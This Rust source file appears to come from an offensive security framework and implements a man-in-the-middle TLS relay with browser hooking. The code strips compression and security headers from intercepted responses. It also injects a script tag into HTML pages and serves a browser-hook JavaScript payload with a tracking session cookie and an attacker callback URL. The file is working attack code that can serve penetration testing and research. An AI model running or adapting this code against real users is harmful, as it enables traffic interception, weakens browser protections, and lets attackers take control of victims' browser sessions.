use std::collections::HashMap;
use std::io::{Read, Write};
use std::time::{SystemTime, UNIX_EPOCH};

use super::{
  websocket::websocket_passthrough, HookMode, HttpRequest, HttpResponse, InterceptAction,
  MitmConfig, ProxyResult,
};
use crate::debug;
use crate::modules::exploit::browser::hook as rbb_hook;

fn generate_session_id() -> String {
  let timestamp = SystemTime::now()
    .duration_since(UNIX_EPOCH)
    .unwrap_or_default()
    .as_nanos();

  let stack_var: u64 = 0;
  let addr = &stack_var as *const u64 as u64;
  let mixed = timestamp as u64 ^ addr.wrapping_mul(0x517cc1b727220a95);
  format!("{:016x}", mixed)
}

fn generate_hook_response(callback_url: &str, hostname: &str) -> HttpResponse {
  let session_id = generate_session_id();
  let js_body = rbb_hook::generate_hook_js_with_session(callback_url, &session_id);

  let mut headers = HashMap::new();
  headers.insert(
    "content-type".to_string(),
    "application/javascript; charset=utf-8".to_string(),
  );
  headers.insert("content-length".to_string(), js_body.len().to_string());
  headers.insert(
    "cache-control".to_string(),
    "no-cache, no-store, must-revalidate".to_string(),
  );
  headers.insert("pragma".to_string(), "no-cache".to_string());
  headers.insert("expires".to_string(), "0".to_string());

  let root_domain = get_root_domain(hostname);
  headers.insert(
    "set-cookie".to_string(),
    format!(
      "_rb_sid={}; Path=/; Domain={}; SameSite=Lax; Max-Age=86400",
      session_id, root_domain
    ),
  );

  HttpResponse {
    version: "HTTP/1.1".to_string(),
    status_code: 200,
    status_text: "OK".to_string(),
    headers,
    body: js_body.into_bytes(),
  }
}

fn get_root_domain(hostname: &str) -> String {
  let parts: Vec<&str> = hostname.split('.').collect();
  if parts.len() >= 2 {
    format!(".{}.{}", parts[parts.len() - 2], parts[parts.len() - 1])
  } else {
    hostname.to_string()
  }
}

pub(super) fn relay_tls_with_hook<S1, S2>(
  client: &mut S1,
  target: &mut S2,
  hostname: &str,
  config: &MitmConfig,
) -> ProxyResult<()>
where
  S1: Read + Write,
  S2: Read + Write,
{
  let hook_mode = config.hook_mode.as_ref().unwrap();
  let mut client_buf = [0u8; 65536];
  let mut target_buf = [0u8; 65536];
  let mut last_request: Option<HttpRequest> = None;

  let (inject_script, intercept_path, callback_url) = match hook_mode {
    HookMode::External(url) => (format!("<script src=\"{}\"></script>", url), None, None),
    HookMode::SameOrigin { path, callback_url } => (
      format!("<script src=\"{}\"></script>", path),
      Some(path.clone()),
      Some(callback_url.clone()),
    ),
  };

  loop {
    let n = match client.read(&mut client_buf) {
      Ok(0) => break,
      Ok(n) => n,
      Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => continue,
      Err(e) => return Err(e.into()),
    };

    let mut data_to_send = client_buf[..n].to_vec();
    let mut is_websocket_upgrade = false;
    let mut serve_hook_directly = false;

    if let Some(mut req) = HttpRequest::parse(&data_to_send) {
      config
        .logger
        .log_request(hostname, &req.method, &req.path, &req.version);

      let request_action = if let Some(interceptor) = &config.interceptor {
        interceptor.on_request(&mut req, Some(hostname))
      } else {
        InterceptAction::Continue
      };

      match request_action {
        InterceptAction::Continue => {
          if let Some(ref hook_path) = intercept_path {
            let req_path_clean = req.path.split('?').next().unwrap_or(&req.path);
            if req_path_clean == hook_path {
              config.logger.log_info(&format!(
                "[{}] Intercepting hook request: {} -> serving RBB hook",
                hostname, req.path
              ));
              serve_hook_directly = true;
            }
          }

          if req.is_websocket_upgrade() {
            config.logger.log_info(&format!(
              "[{}] WebSocket upgrade request detected (hook mode)",
              hostname
            ));
            is_websocket_upgrade = true;
          } else if !serve_hook_directly && req.headers.remove("accept-encoding").is_some() {
            debug!("Stripped Accept-Encoding from {}", hostname);
          }

          data_to_send = req.to_bytes();
          last_request = Some(req);
        }
        InterceptAction::Drop => {
          let resp = HttpResponse::simple(403, "Forbidden", "Request dropped by interceptor");
          client.write_all(&resp.to_bytes())?;
          continue;
        }
        InterceptAction::Replace(resp) => {
          client.write_all(&resp.to_bytes())?;
          continue;
        }
      }
    } else {
      last_request = None;
    }

    if serve_hook_directly {
      if let Some(ref cb_url) = callback_url {
        let resp = generate_hook_response(cb_url, hostname);
        config
          .logger
          .log_response(hostname, resp.status_code, &resp.status_text);
        config.logger.log_info(&format!(
          "[{}] Served RBB hook ({} bytes) with session cookie - callback: {}",
          hostname,
          resp.body.len(),
          cb_url
        ));
        client.write_all(&resp.to_bytes())?;
        continue;
      }
    }

    target.write_all(&data_to_send)?;

    let m = match target.read(&mut target_buf) {
      Ok(0) => break,
      Ok(m) => m,
      Err(e) => return Err(e.into()),
    };

    let mut resp_data = target_buf[..m].to_vec();

    if is_websocket_upgrade {
      if let Some(mut resp) = HttpResponse::parse(&resp_data) {
        if let Some(interceptor) = &config.interceptor {
          if let Some(req) = last_request.as_ref() {
            match interceptor.on_response(req, &mut resp) {
              InterceptAction::Continue => {}
              InterceptAction::Drop => {
                last_request = None;
                continue;
              }
              InterceptAction::Replace(replacement) => {
                let replacement = replacement.to_bytes();
                config
                  .logger
                  .log_response(hostname, resp.status_code, &resp.status_text);
                client.write_all(&replacement)?;
                last_request = None;
                continue;
              }
            }
          }
        }

        config
          .logger
          .log_response(hostname, resp.status_code, &resp.status_text);
        resp_data = resp.to_bytes();

        if resp.is_websocket_upgrade() {
          config.logger.log_info(&format!(
            "[{}] WebSocket upgrade accepted (101 Switching Protocols)",
            hostname
          ));
          client.write_all(&resp_data)?;
          return websocket_passthrough(client, target, hostname, &config.logger);
        }
      }

      client.write_all(&resp_data)?;
      continue;
    }

    if let Some(mut resp) = HttpResponse::parse(&resp_data) {
      resp.strip_security_headers();

      if let Some(interceptor) = &config.interceptor {
        if let Some(req) = last_request.as_ref() {
          match interceptor.on_response(req, &mut resp) {
            InterceptAction::Continue => {}
            InterceptAction::Drop => {
              last_request = None;
              continue;
            }
            InterceptAction::Replace(replacement) => {
              let replacement = replacement.to_bytes();
              config
                .logger
                .log_response(hostname, resp.status_code, &resp.status_text);
              client.write_all(&replacement)?;
              last_request = None;
              continue;
            }
          }
        }
      }

      let content_type = resp
        .headers
        .get("content-type")
        .map(|s| s.to_lowercase())
        .unwrap_or_default();

      if content_type.contains("text/html") {
        let body_str = String::from_utf8_lossy(&resp.body);
        if body_str.contains("</body>") {
          let hook_script = format!("{}</body>", inject_script);
          let new_body_str = body_str.replace("</body>", &hook_script);
          resp.body = new_body_str.into_bytes();
          resp
            .headers
            .insert("content-length".to_string(), resp.body.len().to_string());

          config
            .logger
            .log_info(&format!("Injected hook into response from {}", hostname));
          resp_data = resp.to_bytes();
        }
      }

      config
        .logger
        .log_response(hostname, resp.status_code, &resp.status_text);
      resp_data = resp.to_bytes();
    }

    client.write_all(&resp_data)?;
    last_request = None;
  }

  Ok(())
}
